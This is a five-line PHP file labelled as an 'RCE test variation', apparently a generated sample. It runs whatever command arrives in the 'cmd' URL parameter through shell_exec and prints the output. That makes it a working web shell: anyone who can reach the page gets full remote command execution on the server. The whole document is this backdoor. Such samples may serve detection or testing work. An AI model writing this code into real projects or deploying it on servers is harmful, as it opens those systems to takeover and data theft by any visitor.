<?php
// RCE test variation #862
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>